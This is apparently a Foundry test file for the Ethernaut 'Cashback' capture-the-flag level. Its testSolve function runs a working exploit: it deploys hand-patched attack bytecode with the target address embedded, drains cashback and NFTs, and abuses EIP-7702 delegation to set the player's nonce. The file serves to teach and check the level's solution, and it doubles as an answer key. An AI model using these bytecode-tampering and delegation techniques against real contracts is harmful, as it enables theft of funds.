// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Cashback, Currency} from "src/levels/Cashback.sol";
import {CashbackFactory, SuperCashbackNFT} from "src/levels/CashbackFactory.sol";
import {
    CashbackAttack, CashbackAttackBytecodeDeployer, CashbackAttackNonceSetter
} from "src/attacks/CashbackAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestCashback is Test, Utils {
    Ethernaut ethernaut;
    Cashback instance;
    CashbackFactory factory;

    address payable owner;
    address player;
    uint256 playerKey;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        (player, playerKey) = makeAddrAndKey("Player");
        vm.deal(player, 1 ether);

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        factory = new CashbackFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Cashback(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        // Assert Cashback Rates
        assertEq(instance.cashbackRates(Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE))), 50);
        assertEq(instance.cashbackRates(Currency.wrap(address(factory.FREE()))), 200);
        assertEq(instance.maxCashback(Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE))), 1 ether);
        assertEq(instance.maxCashback(Currency.wrap(address(factory.FREE()))), 500 ether);

        assertEq(SuperCashbackNFT(instance.superCashbackNFT()).owner(), address(instance));
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player, player);
        
        // Creation bytecode prefix with code size modified
        //61 04 F4 // Push 0x04F4 (runtime code size)
        //80 // DUP1
        //60 0B // Push 0x0B (runtime code offset)
        //5f // Push 0
        //39 // CODECOPY Copy to memory at 0x00 the code starting at 0x1c of size 0x04F4
        //5f // PUSH0
        //f3 // RETURN
        //fe // INVALID
        bytes memory creationCodePrefix = hex"6104F480600B5F395FF3FE";

        // CashbackAttack Bytecode with jump opcodes modified to jump to the correct offsets
        bytes memory runtimeCodeJumpOffset =
            hex"6080604052348015610027575f5ffd5b5060043610610062575f3560e01c806334b151181461006657806349f426501461008157806366a79de0146100b45780638380edb7146100c9575b5f5ffd5b61006e6100d8565b6040519081526020015b60405180910390f35b61008473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b6040516001600160a01b039091168152602001610078565b6100c76100c23660046103e7565b6100fa565b005b60405160018152602001610078565b5f805460ff166100f557505f805460ff1916600117905561271090565b505f90565b60405163ebc3961360e01b815273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6004820152680ad78ebc5ac6200000602482015283906001600160a01b0386169063ebc39613906044015f604051808303815f87803b15801561015d575f5ffd5b505af115801561016f573d5f5f3e3d5ffd5b505060405163ebc3961360e01b81526001600160a01b03848116600483015269054b40b1f852bda0000060248301528816925063ebc3961391506044015f604051808303815f87803b1580156101c3575f5ffd5b505af11580156101d5573d5f5f3e3d5ffd5b5050604080517ff242432a0000000000000000000000000000000000000000000000000000000081523060048201526001600160a01b03868116602483015273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6044830152670de0b6b3a7640000606483015260a060848301525f60a483018190529251908a16945063f242432a935060c4808301939282900301818387803b158015610274575f5ffd5b505af1158015610286573d5f5f3e3d5ffd5b50505050846001600160a01b031663f242432a30846102b4856001600160a01b03166001600160a01b031690565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e086901b1681526001600160a01b0393841660048201529290911660248301526044820152681b1ae4d6e2ef500000606482015260a060848201525f60a482015260c4015f604051808303815f87803b158015610334575f5ffd5b505af1158015610346573d5f5f3e3d5ffd5b50506040517f23b872dd00000000000000000000000000000000000000000000000000000000815230600482018190526001600160a01b0386811660248401526044830191909152861692506323b872dd91506064015f604051808303815f87803b1580156103b3575f5ffd5b505af11580156103c5573d5f5f3e3d5ffd5b505050505050505050565b6001600160a01b03811681146103e4575f5ffd5b50565b5f5f5f5f608085870312156103fa575f5ffd5b8435610405816103d0565b93506020850135610415816103d0565b92506040850135610425816103d0565b91506060850135610435816103d0565b93969295509093505056fea26469706673582212202e0d76d852d9edd94717178973a78702f6bc3071a7ae373162c114f2104e014d64736f6c634300081e0033";

        // Tampered runtime bytecode
        // 60 17 Push 0x17
        // 56 JUMP to 0x17
        // instance Address
        // 5B
        // type(CashbackAttack).runtimeCode with offset applied to jump instructions
        bytes memory runtimeCodeTampered =
            bytes.concat(hex"601756", abi.encodePacked(instance), hex"5B", runtimeCodeJumpOffset);

        // Deploy the tampered attack contract using a factory
        CashbackAttackBytecodeDeployer deployer = new CashbackAttackBytecodeDeployer();
        CashbackAttack attackContract =
            CashbackAttack(deployer.deployFromBytecode(bytes.concat(creationCodePrefix, runtimeCodeTampered)));

        // Execute attack pahse 1
        attackContract.attack(instance, factory.FREE(), SuperCashbackNFT(instance.superCashbackNFT()), player);

        // Execute attack phase 2
        CashbackAttackNonceSetter nonceSetter = new CashbackAttackNonceSetter();
        vm.signAndAttachDelegation(address(nonceSetter), playerKey);
        CashbackAttackNonceSetter(payable(address(player))).setNonce(9999);

        vm.signAndAttachDelegation(address(instance), playerKey);
        Cashback(payable(address(player))).payWithCashback(
            Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)), player, 1
        );

        // Check level completion
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
